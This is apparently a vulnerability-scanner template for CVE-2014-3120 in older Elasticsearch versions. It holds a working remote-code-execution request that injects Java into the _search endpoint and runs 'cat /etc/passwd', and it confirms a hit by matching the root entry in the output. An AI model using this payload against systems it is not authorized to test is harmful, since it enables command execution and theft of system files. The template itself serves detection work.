id: cve-2014-3120
info:
  author: pikpikcu
  description: 'The default configuration in Elasticsearch before 1.2 enables dynamic
    scripting, which allows remote attackers to execute arbitrary MVEL expressions
    and Java code via the source parameter to _search. NOTE: this only violates the
    vendor''s intended security policy if the user does not run Elasticsearch in its
    own independent virtual machine.

    '
  name: ElasticSearch v1.1.1/1.2 RCE
  reference: '- https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120

    - https://www.elastic.co/blog/logstash-1-4-3-released

    '
  severity: critical
  tags: cve,cve2014,elastic,rce
requests:
- matchers:
  - part: header
    type: word
    words:
    - application/json
  - part: body
    regex:
    - root:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /_search?pretty HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language:\
    \ en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;\
    \ Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\n\
    Content-Length: 343\n\n{\n    \"size\": 1,\n    \"query\": {\n      \"filtered\"\
    : {\n        \"query\": {\n          \"match_all\": {\n          }\n        }\n\
    \      }\n    },\n    \"script_fields\": {\n        \"command\": {\n         \
    \   \"script\": \"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\\
    \"cat /etc/passwd\\\").getInputStream()).useDelimiter(\\\"\\\\\\\\A\\\").next();\"\
    \n        }\n    }\n}\n"
